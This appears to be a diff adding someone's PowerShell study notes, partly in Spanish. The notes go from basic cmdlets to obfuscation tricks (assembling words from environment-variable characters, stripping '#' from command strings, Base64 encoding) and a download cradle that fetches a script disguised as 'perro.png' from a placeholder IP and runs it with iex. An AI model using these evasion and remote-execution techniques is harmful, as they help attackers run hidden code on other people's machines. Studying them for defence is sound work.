@@ -1,0 +1,52 @@
+#BASIC
+Get-Command *-service*
+Get-Process 
+
+$list = "Get-Command"
+iex $list
+
+(Invoke-WebRequest -Uri " " ).links.Href
+$link = (Invoke-WebRequest -Uri " " ).links.Href
+
+Set-ExecutionPolicy (manual)
+unrestricted
+
+Copy-Item "test.txt" -Destination "path"
+Copy-Item $env:APPDATA -Destionation $env:Path    *si pone $env te se desplega
+
+Get-Content "C:\Users\Public" -TotalCount 20
+
+Start-Process notepad
+Stop-Process  notepad -v -f
+
+Get-Process | Format-List -Property name,path
+
+$test = (New-Object net.webclient).DownloadString('')
+----------------------------------------------------------------------------
+#Ofuscacion 
+Windows Manager Instrumentation
+powershell ipconfig
+powershell Get-WmiObject -class win32_computersystem
+---------------------------------------------------------------------------
+$XTZ = $env:LOCALAPPDATA[0,23,21,7,7] -join '' join parseo puedes meterle , :
+powershell Get-WmiObject -$XTZ win32_computersystem "string CLASS ofuscation"
+--------------------------------------------------------------------------
+$gato = "Get-WmiObject -class win32_computersystem"
+$perro = $gato.Split("#") -join ''
+powershell $perro
+
+$gato = "Get-W#mi#O#b#j#ect -c#l#a#s#s w#i#n#3#2#_#c#o#m#putersystem"
+$perro = $gato.Split("#") -join ''
+powershell $perro
+-----------------------------------------------------------------------------
+ejecutar comandos desde un host remoto
+$test = Get-Process | Format-List -Property name,path  save as 1.png or 1.jpg and upload to server
+$test = (New-Object net.webclient).DownloadString('http://ip/perro.png')
+iex $test
+-----------------------------------------------------------------------------
+$pepe = $test = (New-Object net.webclient).DownloadString('https://www.google.es')
+$link = "https://www.google.es"
+$perro2 = [System.Text.Encoding]::Unicode.GetBytes($link)
+$code = [convert]::ToBase64String($perro2)
+
+
